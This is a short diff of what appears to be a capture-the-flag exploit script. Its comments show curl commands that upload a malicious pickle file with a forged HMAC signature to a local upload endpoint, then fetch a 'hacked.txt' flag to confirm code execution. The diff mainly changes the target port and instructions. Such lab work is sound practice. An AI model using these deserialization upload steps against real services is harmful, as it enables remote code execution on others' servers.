@@ -17,12 +17,10 @@ print(f"HMAC signature: {sig}")
 
 # hacker then uploads the malicious.pkl file on the website
 '''
-curl -X POST http://localhost:916/upload \
+curl -X POST http://127.0.0.1:5000/upload \
   -F "file=@malicious.pkl" \
-  -F "sig=02c4d0035b398f461d77de9fd987abe50fee4d48292409063b53daba32d3be71"  # requires correct sig here
+  -F "sig=02c4..."  # requires correct sig here
 '''
-'''
-1. generate hacked.txt below /uploads/
-2. check the flag by $ curl http://localhost:916/uploads/hacked.txt
 
-'''
+# 1. generate hacked.txt below app/uploads/{your_uuid}
+# 2. check the flag by $ curl http://localhost:916/uploads/{your_uuid}/hacked.txt
